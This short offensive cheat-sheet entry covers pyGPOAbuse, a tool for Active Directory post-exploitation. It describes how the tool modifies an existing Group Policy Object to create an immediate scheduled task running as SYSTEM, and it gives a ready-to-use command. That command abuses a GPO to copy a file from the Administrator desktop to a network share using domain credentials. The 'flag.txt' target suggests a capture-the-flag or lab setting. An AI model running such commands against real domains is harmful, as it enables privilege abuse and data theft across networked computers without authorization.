# pyGPOAbuse

% Active directory, gpo 
#plateform/linux #target/remote #cat/POSTEXPLOIT/GPO  

## pyGPOAbuse - desc
```
modify an existing GPO that applies to one or more users & computers. It will create an immediate scheduled task as SYSTEM on the remote computer for computer GPO, or as logged in user for user GPO.
```

## pyGPOAbuse - repo
```
https://github.com/Hackndo/pyGPOAbuse
```

## pyGPOAbuse - doc
```
```

## pyGPOAbuse - install
```
```

## immadiat task for computer

```
pygpoabuse.py -gpo-id "gpo_id" -powershell -command 'cp C:\Users\Administrator\Desktop\flag.txt "\\sde01\shared\$($env:computername).txt"' -taskname "<task_name|t_jubeaz>" -description "pwn ta face" -f -dc-ip 172.19.99.10 <domain_fqdn>/<user>:<password>
```